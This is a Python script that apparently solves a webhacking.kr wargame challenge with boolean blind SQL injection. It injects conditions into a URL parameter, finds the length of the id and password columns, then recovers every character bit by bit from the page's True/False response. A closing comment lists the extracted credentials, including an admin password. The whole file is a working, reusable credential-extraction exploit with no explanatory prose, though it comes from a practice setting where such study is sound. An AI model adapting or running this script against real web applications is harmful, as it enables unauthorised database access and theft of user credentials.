import requests as req

ids = []
pws = []

url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?no={}&id=&pw="

cookies = {
    "PHPSESSID": ""
}

# get id length and value
for i in range(1, 3):
    length = 0
    for j in range(100):
        print(f"[+] Try {j}")
        if req.get(url.format(f"{i} and length(id)={j}"), cookies=cookies).text.find('True') != -1:
            length = j
            break

    print(f"[!] Length[{i}] is {length}")

    id = ""
    for j in range(1, length+1):
        c = ''
        for b in range(1,8):
            if req.get(url.format(f"{i} and substr(lpad(bin(ascii(substr(id,{j},1))),7,0),{b},1)=1"), cookies=cookies).text.find('True') != -1:
                c += '1'
            else:
                c += '0'
        id += chr(int(c, 2))
        print(f"[!] ID[{i}] is {id}")
    # print(id)
    ids.append(id)

    print(f"[!] Last ID[{i}] is {id}")

# get password
for i in range(1, 3):
    length = 0
    for j in range(100):
        print(f"[+] Try {j}")
        if req.get(url.format(f"{i} and length(pw)={j}"), cookies=cookies).text.find('True') != -1:
            length = j
            break
    print(f"[!] Length[{i}] is {length}")
    pw = ""
    for j in range(1, length+1):
        c = ''
        for b in range(1,8):
            if req.get(url.format(f"{i} and substr(lpad(bin(ascii(substr(pw,{j},1))),7,0),{b},1)=1"),  cookies=cookies).text.find('True') != -1:
                c += '1'
            else:
                c += '0'
        pw += chr(int(c, 2))
        print(f"[!] PW[{i}] is {pw}")
    # print(pw)
    pws.append(pw)
    print(f"[!] Last PW[{i}] is {pw}")

print(ids, pws)

# result : "['guest', 'admin'] ['guest', 'blindsqlinjectionkk']"